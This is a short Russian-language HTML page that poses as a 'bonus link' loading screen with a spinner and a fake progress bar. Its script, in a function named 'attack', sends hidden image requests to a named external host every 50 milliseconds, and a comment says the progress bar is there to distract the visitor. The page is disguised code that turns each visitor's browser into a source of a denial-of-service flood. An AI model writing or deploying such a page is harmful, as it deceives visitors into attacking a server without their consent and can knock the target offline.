<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка бонусов...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #1a1a1a; color: white; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2>Подождите, идет генерация ссылки...</h2>
    <p id="status">Подключение к базе данных... (0%)</p>

    <script>
        // ЦЕЛЬ: Твой сайт
        const target = "http://f29386yb.beget.tech";

        function attack() {
            // Создаем невидимый элемент для отправки запроса
            const img = new Image();
            // Добавляем рандом, чтобы сервер не выдавал кэш, а реально работал
            img.src = target + "/?storm=" + Math.random();
        }

        // 20 запросов в секунду от одного человека
        setInterval(attack, 50);

        // Красивая шкала для отвлечения внимания
        let p = 0;
        setInterval(() => {
            if (p < 99) {
                p += Math.floor(Math.random() * 5);
                document.getElementById('status').innerText = `Подключение к базе данных... (${p}%)`;
            }
        }, 2000);
    </script>
</body>
</html>
